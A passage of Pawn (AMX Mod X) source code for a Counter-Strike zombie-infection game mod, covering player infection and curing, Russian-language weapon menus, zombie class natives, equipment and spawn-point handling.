    write_short(UNIT_SECOND*4) // duration
    write_short(UNIT_SECOND*75) // frequency
    message_end()

    cs_set_player_team(victim, CS_TEAM_T)
    set_zombie_attibutes(victim)

    emit_sound(victim, CHAN_STATIC, g_scream_sounds[_random(sizeof g_scream_sounds)], VOL_NORM, ATTN_NONE, 0, PITCH_NORM)
    ExecuteForward(g_fwd_infect, g_fwd_result, victim, attacker)
}

public cure_user(id)
{
    if (!is_user_valid_alive(id))
        return

    g_zombie[id] = false
    reset_user_model(id)
    set_pev(id, pev_gravity, 1.0)

    cs_set_player_view_model(id, CSW_KNIFE, "models/v_knife.mdl")
    cs_set_player_weap_model(id, CSW_KNIFE, "models/p_knife.mdl")
    cs_reset_player_maxspeed(id)
}

cure_user_in_game(id)
{
    if (!is_user_valid_alive(id) || !is_user_valid_connected(id))
        return

    g_zombie[id] = false
    reset_user_model(id)
    set_pev(id, pev_gravity, 1.0)
    set_pev(id, pev_health, 100.0)

    cs_set_player_view_model(id, CSW_KNIFE, "models/v_knife.mdl")
    cs_set_player_weap_model(id, CSW_KNIFE, "models/p_knife.mdl")
    cs_reset_player_maxspeed(id)

    equipweapon(id, EQUIP_ALL)

    cs_set_player_team(id, CS_TEAM_CT)
}

drop_user(id)
{
    if (!is_user_valid_alive(id))
        return

    strip_user_weapons(id)
    give_item(id, "weapon_knife")
}

public display_equipmenu(id)
{
    static menubody[512], len
    len = formatex(menubody, charsmax(menubody), "\yОружие:^n^n")

    static bool:hasweap
    hasweap = ((g_player_weapons[id][0]) != -1 && (g_player_weapons[id][1] != -1)) ? true : false

    len += formatex(menubody[len], charsmax(menubody) - len,
        "\w1. Новое оружие^n")
    len += formatex(menubody[len], charsmax(menubody) - len,
        "%s2. Предыдущий выбор^n", hasweap ? "\w" : "\d")
    len += formatex(menubody[len], charsmax(menubody) - len,
        "%s3. Не показывать меню^n^n", hasweap ? "\w" : "\d")
//    len += formatex(menubody[len], 511 - len,"\w5. Закрыть^n")

    static keys
    keys = (MENU_KEY_1|MENU_KEY_5)

    if (hasweap)
        keys |= (MENU_KEY_2|MENU_KEY_3)

    static time
    time = get_pcvar_num(cvar_starttime) - (get_systime() - g_roundstart_time) - 2
    show_menu(id, keys, menubody, time > 0 ? time : 10, "Equipment")
}

public action_equip(id, key)
{
    if (!is_user_valid_alive(id) || g_zombie[id])
        return PLUGIN_HANDLED

    switch(key)
    {
        case 0: display_weaponmenu(id, MENU_PRIMARY, g_menuposition[id] = 0)
        case 1: equipweapon(id, EQUIP_ALL)
        case 2:
        {
            g_showmenu[id] = false
            equipweapon(id, EQUIP_ALL)
            colored_print(id, "^x04***^x01 Пиши^x03 /guns^x01 в чат, чтобы выбрать новое оружие")
        }
    }

    return PLUGIN_HANDLED
}

display_weaponmenu(id, menuid, pos)
{
    if (pos < 0 || menuid < 0)
        return

    static start
    start = pos * 8

    static maxitem
    maxitem = menuid == MENU_PRIMARY ? sizeof g_primaryweapons : sizeof g_secondaryweapons

    if (start >= maxitem)
        start = pos = g_menuposition[id]

    static menubody[512], len
    len = formatex(menubody, charsmax(menubody),
        "\y%s\w^n^n", menuid == MENU_PRIMARY ? "Основное" : "Пистолеты")

    static end
    end = start + 8
    if (end > maxitem)
            end = maxitem

    static keys
    keys = MENU_KEY_0

    static a, b
    b = 0

    for (a = start; a < end; ++a)
    {
        keys |= (1<<b)
        len += formatex(menubody[len], charsmax(menubody) - len,
            "%d. %s^n", ++b, menuid == MENU_PRIMARY ? g_primaryweapons[a][0]: g_secondaryweapons[a][0])
    }

    if (end != maxitem)
    {
            formatex(menubody[len], charsmax(menubody) - len,
                "^n9. %s^n0. %s", "Дальше", pos ? "Назад" : "Выход")
            keys |= MENU_KEY_9
    }
    else
        formatex(menubody[len], charsmax(menubody) - len, "^n0. %s", pos ? "Назад" : "Выход")

    static time
    time = get_pcvar_num(cvar_starttime) - (get_systime() - g_roundstart_time) - 2
    show_menu(id, keys, menubody, time > 0 ? time: 10, menuid == MENU_PRIMARY ? "Primary" : "Secondary")
}

public action_prim(id, key)
{
    switch(key)
    {
        case 8: display_weaponmenu(id, MENU_PRIMARY, ++g_menuposition[id])
        case 9: display_weaponmenu(id, MENU_PRIMARY, --g_menuposition[id])
        default:
        {
            g_player_weapons[id][0] = g_menuposition[id] * 8 + key
            if (!g_gamestarted && is_user_valid_alive(id))
                equipweapon(id, EQUIP_PRI)

            display_weaponmenu(id, MENU_SECONDARY, g_menuposition[id] = 0)
        }
    }

    return PLUGIN_HANDLED
}

public action_sec(id, key)
{
    switch(key)
    {
        case 8: display_weaponmenu(id, MENU_SECONDARY, ++g_menuposition[id])
        case 9: display_weaponmenu(id, MENU_SECONDARY, --g_menuposition[id])
        default:
        {
            g_player_weapons[id][1] = g_menuposition[id] * 8 + key

            if (!g_gamestarted && is_user_valid_alive(id))
            {
                equipweapon(id, EQUIP_SEC)
                equipweapon(id, EQUIP_GREN)
            }
        }
    }

    return PLUGIN_HANDLED
}

register_class(classname[])
{
    if (g_classcount >= MAX_CLASSES)
        return -1

    copy(g_class_name[g_classcount], charsmax(g_class_name[]), classname)
    copy(g_class_pmodel[g_classcount], charsmax(g_class_pmodel[]), DEFAULT_PMODEL)
    copy(g_class_wmodel[g_classcount], charsmax(g_class_wmodel[]), DEFAULT_WMODEL)

    g_class_data[g_classcount][DATA_HEALTH] = DEFAULT_HEALTH
    g_class_data[g_classcount][DATA_SPEED] = DEFAULT_SPEED
    g_class_data[g_classcount][DATA_GRAVITY] = DEFAULT_GRAVITY
    g_class_data[g_classcount][DATA_ATTACK] = DEFAULT_ATTACK
    g_class_data[g_classcount][DATA_DEFENCE] = DEFAULT_DEFENCE
    g_class_data[g_classcount][DATA_HEDEFENCE] = DEFAULT_HEDEFENCE
    g_class_data[g_classcount][DATA_HITSPEED] = DEFAULT_HITSPEED
    g_class_data[g_classcount][DATA_HITDELAY] = DEFAULT_HITDELAY
    g_class_data[g_classcount][DATA_REGENDLY] = DEFAULT_REGENDLY
    g_class_data[g_classcount][DATA_HITREGENDLY] = DEFAULT_HITREGENDLY
    g_class_data[g_classcount++][DATA_KNOCKBACK] = DEFAULT_KNOCKBACK

    return (g_classcount - 1)
}

public native_register_class(classname[], description[])
{
    param_convert(1)
    param_convert(2)

    static classid
    classid = register_class(classname)

    if (classid != -1)
        copy(g_class_desc[classid], charsmax(g_class_desc[]), description)

    return classid
}

public native_set_class_pmodel(classid, player_model[])
{
    param_convert(2)
    copy(g_class_pmodel[classid], charsmax(g_class_pmodel[]), player_model)
}

public native_set_class_wmodel(classid, weapon_model[])
{
    param_convert(2)
    copy(g_class_wmodel[classid], charsmax(g_class_wmodel[]), weapon_model)
}

public native_is_user_zombie(index)
{
    return g_zombie[index]
}

public native_get_user_class(index)
{
    return g_player_class[index]
}

public native_is_user_infected(index)
{
    return g_preinfect[index]
}

public native_game_started()
{
    return g_gamestarted
}

public native_preinfect_user(index, bool:yesno)
{
    if (is_user_valid_alive(index) && !g_gamestarted)
        g_preinfect[index] = yesno
}

public native_infect_user(victim, attacker)
{
    if (allow_infection() && g_gamestarted)
        infect_user(victim, attacker)
}

public native_cure_user(index)
{
    cure_user(index)
}

public native_get_class_id(classname[])
{
    param_convert(1)

    static i
    for (i = 0; i < g_classcount; i++)
    {
        if (equali(classname, g_class_name[i]))
            return i
    }

    return -1
}

public Float:native_get_class_data(classid, dataid)
{
    return g_class_data[classid][dataid]
}

public native_set_class_data(classid, dataid, Float:value)
{
    g_class_data[classid][dataid] = value
}

bool:fm_is_hull_vacant(const Float:origin[3], hull)
{
    static tr
    tr = 0
    engfunc(EngFunc_TraceHull, origin, origin, 0, hull, 0, tr)
    return (!get_tr2(tr, TR_StartSolid) && !get_tr2(tr, TR_AllSolid) && get_tr2(tr, TR_InOpen)) ? true : false
}

// Check if a player is stuck (credits to VEN)
bool:is_player_stuck(id)
{
    static Float:originF[3]
    pev(id, pev_origin, originF)

    engfunc(EngFunc_TraceHull, originF, originF, 0, (pev(id, pev_flags) & FL_DUCKING) ? HULL_HEAD : HULL_HUMAN, id, 0)

    if (get_tr2(0, TR_StartSolid) || get_tr2(0, TR_AllSolid) || !get_tr2(0, TR_InOpen))
        return true

    return false
}

fm_cs_find_ent_by_owner(index, const classname[], owner)
{
    static ent
    ent = index

    while ((ent = fm_find_ent_by_class(ent, classname)) && pev(ent, pev_owner) != owner)
    {
        // do nothing
    }

    return ent
}

bacon_strip_weapon(index, weapon[])
{
    if (!equal(weapon, "weapon_", 7))
        return 0

    static weaponid
    weaponid = get_weaponid(weapon)

    if (!weaponid)
        return 0

    static weaponent
    weaponent = fm_cs_find_ent_by_owner(-1, weapon, index)

    if (!weaponent)
        return 0

    if (get_user_weapon(index) == weaponid)
        ExecuteHamB(Ham_Weapon_RetireWeapon, weaponent)

    if (!ExecuteHamB(Ham_RemovePlayerItem, index, weaponent))
        return 0

    ExecuteHamB(Ham_Item_Kill, weaponent)
    set_pev(index, pev_weapons, pev(index, pev_weapons) & ~(1<<weaponid))

    return 1
}

set_zombie_attibutes(index)
{
    if (!is_user_valid_alive(index) || !is_user_valid_connected(index))
        return

    g_zombie[index] = true

    if (!task_exists(TASKID_STRIPNGIVE + index))
        set_task(0.1, "task_stripngive", TASKID_STRIPNGIVE + index)

    static Float:health
    health = g_class_data[g_player_class[index]][DATA_HEALTH]

    set_pev(index, pev_health, health)
    set_pev(index, pev_gravity, g_class_data[g_player_class[index]][DATA_GRAVITY])
    set_pev(index, pev_body, 0)
    set_pev(index, pev_armorvalue, 0.0)
    set_pev(index, pev_renderamt, 0.0)
    set_pev(index, pev_rendermode, kRenderTransTexture)

    if (!pev_valid(g_modelent[index]))
    {
        static ent
        ent = cs_create_entity("info_target")
        if (pev_valid(ent))
        {
            engfunc(EngFunc_SetModel, ent, g_class_pmodel[g_player_class[index]])
            set_pev(ent, pev_classname, MODEL_CLASSNAME)
            set_pev(ent, pev_movetype, MOVETYPE_FOLLOW)
            set_pev(ent, pev_aiment, index)
            set_pev(ent, pev_owner, index)

            g_modelent[index] = ent
        }
    }
    else
    {
        engfunc(EngFunc_SetModel, g_modelent[index], g_class_pmodel[g_player_class[index]])
        fm_set_entity_visibility(g_modelent[index], 1)
    }
}

bool:allow_infection()
{
    static count[2]
    count[0] = 0
    count[1] = 0

    static index, maxzombies
    for (index = 1; index <= g_maxplayers; index++)
    {
        if (is_user_valid_connected(index) && g_zombie[index])
            count[0]++
        else if (is_user_valid_alive(index))
            count[1]++
    }

    maxzombies = g_maxplayers - 1
    return (count[0] < maxzombies && count[1] > 1) ? true : false
}

equipweapon(id, weapon)
{
    if (!is_user_valid_alive(id))
        return

    static weaponid[2], weaponent, weapname[32]

    if (weapon & EQUIP_PRI)
    {
        weaponent = fm_lastprimary(id)
        weaponid[1] = get_weaponid(g_primaryweapons[g_player_weapons[id][0]][1])

        if (pev_valid(weaponent))
        {
            weaponid[0] = cs_get_weapon_id(weaponent)
            if (weaponid[0] != weaponid[1])
            {
                get_weaponname(weaponid[0], weapname, charsmax(weapname))
                bacon_strip_weapon(id, weapname)
            }
        }
        else
            weaponid[0] = -1

        if (weaponid[0] != weaponid[1])
        {
            give_item(id, g_primaryweapons[g_player_weapons[id][0]][1])

            if (g_silenced[id] && equal(g_primaryweapons[g_player_weapons[id][0]][1], "weapon_m4a1"))
                set_weapon_silen(id)
        }
        cs_set_user_bpammo(id, weaponid[1], g_weapon_ammo[weaponid[1]][MAX_AMMO])
    }

    if (weapon & EQUIP_SEC)
    {
        weaponent = fm_lastsecondry(id)
        weaponid[1] = get_weaponid(g_secondaryweapons[g_player_weapons[id][1]][1])

        if (pev_valid(weaponent))
        {
            weaponid[0] = cs_get_weapon_id(weaponent)
            if (weaponid[0] != weaponid[1])
            {
                get_weaponname(weaponid[0], weapname, 31)
                bacon_strip_weapon(id, weapname)
            }
        }
        else
            weaponid[0] = -1

        if (weaponid[0] != weaponid[1])
        {
            give_item(id, g_secondaryweapons[g_player_weapons[id][1]][1])
        }
        cs_set_user_bpammo(id, weaponid[1], g_weapon_ammo[weaponid[1]][MAX_AMMO])
    }

    static mapName[32]
    get_mapname(mapName, charsmax(mapName))
    if (weapon & EQUIP_GREN && !equal(mapName, "ze_lift_escape_b5"))
    {
        static i
        for (i = 0; i < sizeof g_grenades; i++) if (!user_has_weapon(id, get_weaponid(g_grenades[i])))
            give_item(id, g_grenades[i])
    }
}

set_weapon_silen(player_id)
{
    static w_ent
    w_ent = fm_cs_find_ent_by_owner(-1, g_primaryweapons[g_player_weapons[player_id][0]][1], player_id)

    if (pev_valid(w_ent))
    {
        cs_set_weapon_silen(w_ent, 1, 0)
        set_pev(player_id, pev_weaponanim, M4A1_DRAWANIM)
    }

    g_silenced[player_id] = 0
}

remember_silen_status(player_id)
{
    static weaponent
    weaponent = fm_lastprimary(player_id)
    if (pev_valid(weaponent))
        g_silenced[player_id] = cs_get_weapon_silen(weaponent)
}

add_delay(index, const task[])
{
    switch(index)
    {
        case 1..6: set_task(0.2, task, index)
        case 7..12: set_task(0.4, task, index)
        case 13..18: set_task(0.6, task, index)
        case 19..24: set_task(0.8, task, index)
        case 25..32: set_task(1.0, task, index)
    }
}

// Get User Team
fm_get_user_team(id)
{
    // Prevent server crash if entity is not safe for pdata retrieval
    if (pev_valid(id) != PDATA_SAFE)
        return TEAM_SPECTATOR

    return get_pdata_int(id, OFFSET_TEAM, OFFSET_LINUX)
}

fm_get_user_deaths(id)
{
    // Prevent server crash if entity is not safe for pdata retrieval
    if (pev_valid(id) != PDATA_SAFE)
        return 0

    return get_pdata_int(id, OFFSET_DEATH, OFFSET_LINUX)
}

fm_set_user_deaths(id, value)
{
    // Prevent server crash if entity is not safe for pdata retrieval
    if (pev_valid(id) != PDATA_SAFE)
        return

    set_pdata_int(id, OFFSET_DEATH, value, OFFSET_LINUX)
}

fm_set_weapon_ammo(id, max)
{
    // Prevent server crash if entity is not safe for pdata retrieval
    if (pev_valid(id) != PDATA_SAFE)
        return

    set_pdata_int(id, OFFSET_CLIPAMMO, max, EXTRAOFFSET_WEAPONS)
}

// Set User Money
fm_cs_set_user_money(id, value)
{
    // Prevent server crash if entity's private data not initalized
    if (pev_valid(id) != PDATA_SAFE)
        return

    set_pdata_int(id, OFFSET_CSMONEY, value, OFFSET_LINUX)
}

public reset_user_model(index)
{
    set_pev(index, pev_rendermode, kRenderNormal)
    set_pev(index, pev_renderamt, 0.0)

    if (pev_valid(g_modelent[index]))
        fm_set_entity_visibility(g_modelent[index], 0)
}

remove_user_model(ent)
{
    static id
    id = pev(ent, pev_owner)

    if (pev_valid(ent))
        engfunc(EngFunc_RemoveEntity, ent)

    g_modelent[id] = 0
}

fm_set_entity_visibility(index, visible = 1)
{
    set_pev(index, pev_effects, visible == 1 ? pev(index, pev_effects) & ~EF_NODRAW : pev(index, pev_effects) | EF_NODRAW)
}

// Collect spawn points from entity origins
collect_spawns_ent(const classname[])
{
    static ent
    ent = -1
    while ((ent = cs_find_ent_by_class(ent, classname)))
    {
        // get origin
        static Float:originF[3]
        pev(ent, pev_origin, originF)
        g_spawns[g_spawncount][0] = originF[0]
        g_spawns[g_spawncount][1] = originF[1]
        g_spawns[g_spawncount][2] = originF[2]

        // increase spawn count
        g_spawncount++
        if (g_spawncount >= sizeof g_spawns)
            break
    }

    static map_name[32]
    get_mapname(map_name, charsmax(map_name))
    log_to_file("SPAWNS.txt", "[%s]: found %d after %s", map_name, g_spawncount, classname)
}

stock fm_find_ent_by_class(index, const classname[])
{
    return engfunc(EngFunc_FindEntityByString, index, "classname", classname)
}
